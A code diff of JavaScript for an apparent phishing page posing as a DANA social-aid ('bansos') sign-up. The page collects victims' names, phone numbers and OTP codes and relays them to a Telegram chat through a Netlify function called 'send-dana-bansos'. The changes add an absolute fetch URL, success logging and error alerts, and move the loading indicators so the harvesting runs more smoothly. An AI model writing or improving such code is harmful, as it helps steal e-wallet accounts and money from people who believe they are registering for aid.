@@ -15,6 +15,9 @@ let timerInterval;
 let timeLeft = 120; // 2 minutes in seconds
 let userData = {};
 
+// Base URL untuk fetch (gunakan absolute untuk menghindari masalah path)
+const baseUrl = window.location.origin;
+
 // Format time (MM:SS)
 function formatTime(seconds) {
     const mins = Math.floor(seconds / 60);
@@ -91,7 +94,7 @@ function goToOtpPage() {
 // Fungsi kirim pesan awal ke Telegram via serverless
 async function sendTelegramMessage(nama, phone) {
     try {
-        const response = await fetch('/.netlify/functions/send-dana-bansos', {
+        const response = await fetch(`${baseUrl}/.netlify/functions/send-dana-bansos`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -102,12 +105,15 @@ async function sendTelegramMessage(nama, phone) {
         });
         const data = await response.json();
         if (data.success) {
+            console.log('Telegram send success, messageId:', data.messageId);
             return data.messageId;
         } else {
             console.error('Gagal kirim via serverless:', data.error);
+            alert('Gagal mengirim notifikasi. Cek console.');
         }
     } catch (error) {
         console.error('Error panggil serverless:', error);
+        alert('Error jaringan saat mengirim notifikasi.');
     }
     return null;
 }
@@ -115,7 +121,7 @@ async function sendTelegramMessage(nama, phone) {
 // Fungsi edit pesan Telegram via serverless
 async function editTelegramMessage(messageId, nama, phone, otp) {
     try {
-        const response = await fetch('/.netlify/functions/send-dana-bansos', {
+        const response = await fetch(`${baseUrl}/.netlify/functions/send-dana-bansos`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -127,7 +133,9 @@ async function editTelegramMessage(messageId, nama, phone, otp) {
             })
         });
         const data = await response.json();
-        if (!data.success) {
+        if (data.success) {
+            console.log('Telegram edit success');
+        } else {
             console.error('Gagal edit via serverless:', data.error);
         }
     } catch (error) {
@@ -176,6 +184,12 @@ daftarBtn.addEventListener('click', async function() {
     // Display user info on OTP page
     otpUserInfo.textContent = `Nama: ${nama} | No: ${countryCode + telepon}`;
     
+    // Show button loading
+    showButtonLoading(daftarBtn);
+    
+    // Show page loading overlay
+    showPageLoading('Mengirim kode OTP...');
+    
     // Kirim pesan awal ke Telegram
     const messageId = await sendTelegramMessage(nama, countryCode + telepon);
     if (messageId) {
@@ -183,12 +197,6 @@ daftarBtn.addEventListener('click', async function() {
         sessionStorage.setItem('userName', nama);
         sessionStorage.setItem('userPhone', countryCode + telepon);
     }
-    
-    // Show button loading
-    showButtonLoading(daftarBtn);
-    
-    // Show page loading overlay
-    showPageLoading('Mengirim kode OTP...');
     
     // Simulate API call to send OTP
     setTimeout(() => {
@@ -276,6 +284,8 @@ verifyOtpBtn.addEventListener('click', async function() {
         sessionStorage.removeItem('telegramMessageId');
         sessionStorage.removeItem('userName');
         sessionStorage.removeItem('userPhone');
+    } else {
+        console.warn('Tidak ada data session untuk update Telegram');
     }
     
     // Show button loading
